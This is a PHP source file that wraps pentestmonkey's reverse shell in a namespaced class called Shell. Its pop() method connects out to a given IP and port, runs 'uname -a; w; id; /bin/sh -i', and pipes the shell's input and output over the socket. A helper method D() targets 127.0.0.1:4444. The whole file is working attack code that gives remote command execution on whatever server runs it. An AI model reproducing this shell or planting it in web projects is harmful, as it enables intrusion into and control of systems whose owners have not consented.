<?php

// All credits to pentest-monkey for this actual
// reverse shell code
//  http://pentestmonkey.net/tools/web-shells/php-reverse-shell

namespace Starting\The;

class Shell
{

    public static function pop($ip, $port)
    {
        $sock = fsockopen($ip, $port, $errno, $errstr, 30);

        if (!$sock) {
            printit("$errstr ($errno)");
            exit();
        }

        // Spawn shell process
        $descriptorspec = array(
            0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
            1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
            2 => array("pipe", "w")   // stderr is a pipe that the child will write to
        );

        $process = proc_open('uname -a; w; id; /bin/sh -i', $descriptorspec, $pipes);

        Shell::handle($sock, $process, $pipes, $descriptorspec);

    }

    public static function handle($sock, $process, $pipes, $descriptorspec)
    {

        $chunk_size = 1400;
        $write_a = null;
        $error_a = null;

        while (1) {
            // Check for end of TCP connection
            if (feof($sock)) {
                break;
            }
            // Check for end of STDOUT
            if (feof($pipes[1])) {
                break;
            }
            // Wait until a command is end down $sock, or some
            // command output is available on STDOUT or STDERR
            $read_a = array($sock, $pipes[1], $pipes[2]);
            $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
            // If we can read from the TCP socket, send
            // data to process's STDIN
            if (in_array($sock, $read_a)) {
                $input = fread($sock, $chunk_size);
                fwrite($pipes[0], $input);
            }
            // If we can read from the process's STDOUT
            // send data down tcp connection
            if (in_array($pipes[1], $read_a)) {
                $input = fread($pipes[1], $chunk_size);
                fwrite($sock, $input);
            }
            // If we can read from the process's STDERR
            // send data down tcp connection
            if (in_array($pipes[2], $read_a)) {
                $input = fread($pipes[2], $chunk_size);
                fwrite($sock, $input);
            }
        }
    }

    public static function D()
    {

        Shell::pop('127.0.0.1', 4444);
    }
}

